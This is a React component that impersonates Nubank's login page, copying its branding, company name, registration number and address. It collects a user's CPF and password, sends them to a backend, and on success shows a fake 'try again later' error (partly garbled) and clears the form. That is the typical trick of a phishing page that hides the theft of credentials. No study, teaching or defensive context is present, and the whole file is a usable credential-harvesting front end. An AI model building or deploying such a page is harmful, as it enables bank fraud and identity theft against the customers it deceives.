/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState } from 'react';

export default function App() {
  const [cpf, setCpf] = useState('');
  const [password, setPassword] = useState('');
  const [status, setStatus] = useState('');

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setStatus('Enviando...');
    try {
      const response = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cpf, password })
      });
      if (response.ok) {
        setStatus('❌ Oporária. Tente novamente mais tarde.');
        setCpf('');
        setPassword('');
      } else {
        setStatus('❌ Erro ao enviar dados.');
      }
    } catch (error) {
      setStatus('❌ Erro de conexão com o servidor.');
    }
  };

  return (
    <div className="min-h-screen w-full bg-[#820AD1] flex flex-col md:flex-row font-sans text-white">
      {/* Left Section: Branding & Hero */}
      <div className="w-full md:w-3/5 p-8 md:p-16 flex flex-col justify-between relative bg-gradient-to-br from-[#820AD1] to-[#5F0797] overflow-hidden">
        <div className="flex items-center space-x-3 z-10">
          <div><img src="/nubank.png" alt="Logo" className="w-20 h-20 rounded-xl" />
            <div></div>
          </div>
          <span className="text-2xl font-bold tracking-tight">Nubank</span>
        </div>

        <div className="max-w-md mt-12 md:mt-0 z-10">
          <h1 className="text-4xl md:text-6xl font-extrabold leading-tight mb-6">
            O futuro da sua <span className="text-[#FFB6F1]">vida financeira</span> é agora.
          </h1>
          <p className="text-lg md:text-xl text-purple-100 opacity-90">
            Gerencie seus gastos, invista com inteligência e controle tudo pelo seu celular ou computador.
          </p>
        </div>

        <div className="hidden md:flex space-x-8 text-sm font-medium opacity-70 z-10 mt-12 md:mt-0">
          <span>Segurança 256-bit</span>
          <span>Suporte 24/7</span>
          <span>Acesso Global</span>
        </div>

        {/* Decorative Element */}
        <div className="absolute -bottom-20 -left-20 w-80 h-80 bg-[#FFB6F1] rounded-full mix-blend-screen opacity-20 blur-3xl pointer-events-none"></div>
      </div>

      {/* Right Section: Login Interface */}
      <div className="w-full md:w-2/5 bg-white p-8 md:p-12 flex flex-col justify-center shadow-2xl z-10 flex-grow md:flex-grow-0 rounded-t-3xl md:rounded-none mt-8 md:mt-0">
        <div className="max-w-sm mx-auto w-full">
          <div className="mb-10">
            <h2 className="text-3xl font-bold text-gray-900 mb-2">Faça seu login</h2>
            <p className="text-gray-500">Digite seu CPF para acessar sua conta.</p>
          </div>

          <form className="space-y-6" onSubmit={handleLogin}>
            <div>
              <label className="block text-xs font-bold text-gray-400 uppercase tracking-wider mb-2">CPF</label>
              <input
                type="text"
                value={cpf}
                onChange={(e) => setCpf(e.target.value)}
                placeholder="000.000.000-00"
                className="w-full border-b-2 border-gray-100 py-3 text-lg text-gray-800 focus:outline-none focus:border-[#820AD1] transition-colors placeholder-gray-300"
                required
              />
            </div>

            <div>
              <label className="block text-xs font-bold text-gray-400 uppercase tracking-wider mb-2">Senha</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="••••••••"
                className="w-full border-b-2 border-gray-100 py-3 text-lg text-gray-800 focus:outline-none focus:border-[#820AD1] transition-colors placeholder-gray-300"
                required
              />
            </div>

            <div className="flex items-center justify-between text-sm">
              <a href="#" className="text-[#820AD1] font-semibold hover:underline">Esqueci minha senha</a>
            </div>

            <button
              type="submit"
              className="w-full bg-[#820AD1] hover:bg-[#6A08AA] text-white font-bold py-4 rounded-full shadow-lg transition-all transform active:scale-95">
              Continuar
            </button>
          </form>

          {status && (
            <div className="mt-6 p-4 bg-purple-50 text-[#820AD1] rounded-lg text-sm text-center font-medium border border-purple-100">
              {status}
            </div>
          )}

          <div className="mt-12 pt-8 border-t border-gray-100 text-center">
            <p className="text-gray-500 text-sm">Ainda não tem conta?</p>
            <button className="mt-2 text-[#820AD1] font-bold text-lg hover:underline">
              Abra sua conta agora
            </button>
          </div>
        </div>
        
        <div className="mt-auto text-center pt-8">
          <p className="text-[10px] text-gray-300 uppercase tracking-widest">
            © 2026 Nu Pagamentos S.A - Instituição de Pagamento. 18.236.120/0001-58. Rua Capote Valente, 39 - São Paulo, SP - 05409-000
          </p>
        </div>
      </div>
    </div>
  );
}
